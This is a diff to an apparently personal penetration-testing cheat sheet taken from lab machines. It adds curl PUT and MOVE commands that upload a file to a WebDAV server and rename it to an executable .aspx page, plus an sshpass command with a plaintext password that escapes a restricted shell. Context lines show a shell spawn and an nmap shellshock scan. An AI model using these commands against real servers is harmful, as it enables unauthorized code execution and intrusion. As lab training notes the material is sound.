@@ -1,3 +1,21 @@
+# Web Apps
+### WebDAV
+Manually test putting file for execution 
+`curl -X PUT http://10.10.10.15/df.aspx -d @test.txt ` 
+`curl http://10.10.10.15/df.aspx` 
+
+Replace -d with `--data-binary` if moving exe
+
+The first curl puts the file onto the webserver, and the second proves it’s there. The -d @text.txt syntax says that the data for the request should be the contents of the file text.txt.
+
+If you can upload txt, try MOVE
+```
+-X MOVE - use the MOVE method
+-H 'Destination:http://10.10.10.15/0xdf.aspx' - defines where to move to
+http://10.10.10.15/0xdf.txt - the file to move
+```
+`curl -X MOVE -H 'Destination:http://10.10.10.15/0xdf.aspx' http://10.10.10.15/0xdf.txt` 
+
 # Linux
 ### Spawn shell via Python
 `python3 -c 'import pty;pty.spawn("/bin/bash")' `
@@ -7,6 +25,9 @@
 
 ### nmap scan for shellshock
 `nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56` 
+
+### Escape restricted shell with sshpass
+`sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash` 
 
 ------------------------------------------
 # Windows 
